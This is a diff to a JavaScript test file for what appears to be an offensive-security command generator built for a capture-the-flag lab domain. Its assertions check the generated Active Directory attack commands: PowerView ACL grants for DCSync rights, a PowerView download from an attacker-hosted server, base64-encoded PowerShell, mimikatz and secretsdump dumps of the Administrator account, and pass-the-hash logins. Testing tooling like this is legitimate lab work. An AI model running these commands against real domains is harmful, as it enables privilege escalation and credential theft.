@@ -29,23 +29,34 @@ const renderedCommands = (overrides = {}) => {
   }));
 };
 
+const decodedPowerShell = (command) => {
+  const encoded = command?.value.match(/-EncodedCommand ([A-Za-z0-9+/=]+)"/)?.[1];
+  return encoded ? Buffer.from(encoded, "base64").toString("utf16le") : "";
+};
+
+const decodedScripts = (commands) => commands.map(decodedPowerShell).filter(Boolean).join("\n");
+
 test("DCSync selection generates scoped retrieval between grant and cleanup", () => {
   const commands = renderedCommands();
   const combined = commands.map((command) => command.value).join("\n");
+  const scripts = decodedScripts(commands);
   const grantAt = commands.findIndex((command) => command.key === "acl-grant");
   const retrieveAt = commands.findIndex((command) => command.key === "acl-dcsync-impacket-password");
   const cleanupAt = commands.findIndex((command) => command.key === "acl-cleanup");
 
-  assert.match(combined, /Get-DomainObject -Identity .*DC=htb,DC=local.*-Properties distinguishedName/);
-  assert.match(combined, /Add-DomainObjectAcl -TargetIdentity \$ResolvedTarget.*-PrincipalIdentity .*svc_exchange.*-Rights .*DCSync/);
+  assert.match(scripts, /Get-DomainObject -Identity .*DC=htb,DC=local.*-Properties distinguishedName/);
+  assert.match(scripts, /Add-DomainObjectAcl -TargetIdentity \$ResolvedTarget.*-PrincipalIdentity .*svc_exchange.*-Rights .*DCSync/);
   assert.match(combined, /nxc winrm 10\.129\.95\.210 -d 'htb\.local' -u 'svc_exchange' -p 'Password123!'/);
-  assert.match(combined, /http:\/\/10\.10\.15\.240:8000\/PowerView\.ps1/);
-  assert.match(combined, /-EncodedCommand \$payload/);
-  assert.match(combined, /PowerView download or load failed/);
-  assert.match(combined, /Resolved principal SID/);
-  assert.match(combined, /ConvertTo-SecureString/);
-  assert.match(combined, /-Credential \$Cred/);
-  assert.match(combined, /PowerView returned without persisting an ACL entry/);
+  assert.match(scripts, /http:\/\/10\.10\.15\.240:8000\/PowerView\.ps1/);
+  assert.match(combined, /-EncodedCommand [A-Za-z0-9+/=]+/);
+  assert.doesNotMatch(combined, /payload=\$\(|-EncodedCommand \$payload/);
+  assert.match(combined, /notes\/powershell\/grant-dcsync\.ps1/);
+  assert.match(combined, /base64 -d \| iconv -f UTF-16LE -t UTF-8/);
+  assert.match(scripts, /PowerView download or load failed/);
+  assert.match(scripts, /Resolved principal SID/);
+  assert.match(scripts, /ConvertTo-SecureString/);
+  assert.match(scripts, /-Credential \$Cred/);
+  assert.match(scripts, /PowerView returned without persisting an ACL entry/);
   assert.match(combined, /lsadump::dcsync \/domain:htb\.local \/user:Administrator/);
   assert.match(combined, /-just-dc-user 'Administrator'/);
   assert.ok(grantAt >= 0 && retrieveAt > grantAt && cleanupAt > retrieveAt);
@@ -58,16 +69,17 @@ test("non-DCSync rights regenerate generic grant and cleanup without replication
     aclRights: "WriteMembers",
   });
   const combined = commands.map((command) => command.value).join("\n");
+  const scripts = decodedScripts(commands);
 
-  assert.match(combined, /Get-DomainObject -Identity .*Helpdesk.*-Properties distinguishedName/);
-  assert.match(combined, /Add-DomainObjectAcl -TargetIdentity \$ResolvedTarget.*-PrincipalIdentity .*operator.*-Rights .*WriteMembers/);
-  assert.match(combined, /Remove-DomainObjectAcl -TargetIdentity \$ResolvedTarget.*-PrincipalIdentity .*operator.*-Rights .*WriteMembers/);
+  assert.match(scripts, /Get-DomainObject -Identity .*Helpdesk.*-Properties distinguishedName/);
+  assert.match(scripts, /Add-DomainObjectAcl -TargetIdentity \$ResolvedTarget.*-PrincipalIdentity .*operator.*-Rights .*WriteMembers/);
+  assert.match(scripts, /Remove-DomainObjectAcl -TargetIdentity \$ResolvedTarget.*-PrincipalIdentity .*operator.*-Rights .*WriteMembers/);
   assert.doesNotMatch(combined, /lsadump::dcsync|secretsdump/);
-  assert.match(combined, /acl-before\.xml/);
-  assert.match(combined, /Compare-Object/);
-  assert.match(combined, /Where-Object \{ \$null -ne \$_ \}/);
-  assert.match(combined, /No added ACL entry was detected/);
-  assert.doesNotMatch(combined, /"\$\(\$_\.ActiveDirectoryRights\)\|/);
+  assert.match(scripts, /acl-before\.xml/);
+  assert.match(scripts, /Compare-Object/);
+  assert.match(scripts, /Where-Object \{ \$null -ne \$_ \}/);
+  assert.match(scripts, /No added ACL entry was detected/);
+  assert.doesNotMatch(scripts, /"\$\(\$_\.ActiveDirectoryRights\)\|/);
 });
 
 test("PowerView staging validates content and reports a port or log failure", () => {
@@ -78,17 +90,19 @@ test("PowerView staging validates content and reports a port or log failure", ()
   assert.match(confirmation.value, /grep -qi 'function Get-DomainObjectAcl' "\$pv_probe"/);
   assert.doesNotMatch(confirmation.value, /curl .*\| grep -q/);
   assert.match(confirmation.value, /PowerView HTTP staging failed/);
-  assert.match(confirmation.value, /PowerView loaded successfully/);
-  assert.match(confirmation.value, /Get-DomainGroup/);
+  assert.match(confirmation.value, /notes\/powershell\/confirm-powerview\.ps1/);
+  assert.match(decodedPowerShell(confirmation), /PowerView loaded successfully/);
+  assert.match(decodedPowerShell(confirmation), /Get-DomainGroup/);
 });
 
 test("password workflow lists the authenticating user's effective groups with explicit credentials", () => {
   const commands = renderedCommands();
   const groups = commands.find((command) => command.key === "acl-effective-groups");
+  const script = decodedPowerShell(groups);
 
   assert.match(groups.label, /svc_exchange's effective groups/);
-  assert.match(groups.value, /Get-DomainGroup -MemberIdentity .*svc_exchange/);
-  assert.match(groups.value, /-Credential \$Cred/);
+  assert.match(script, /Get-DomainGroup -MemberIdentity .*svc_exchange/);
+  assert.match(script, /-Credential \$Cred/);
 });
 
 test("DCSync for a different ACL principal omits credential-bound Impacket commands", () => {
@@ -118,7 +132,7 @@ test("hash-only authentication uses NetExec and Evil-WinRM pass-the-hash switche
   assert.match(winrm.value, /-H '8846f7eaee8fb117ad06bdd830b7586c'/);
   assert.doesNotMatch(winrm.value, /-p/);
   assert.match(evilWinrm.value, /-H '8846f7eaee8fb117ad06bdd830b7586c'/);
-  assert.doesNotMatch(commands.map((command) => command.value).join("\n"), /ConvertTo-SecureString|-Credential \$Cred/);
+  assert.doesNotMatch(decodedScripts(commands), /ConvertTo-SecureString|-Credential \$Cred/);
 });
 
 test("WinRM authentication shell-quotes passwords containing apostrophes", () => {
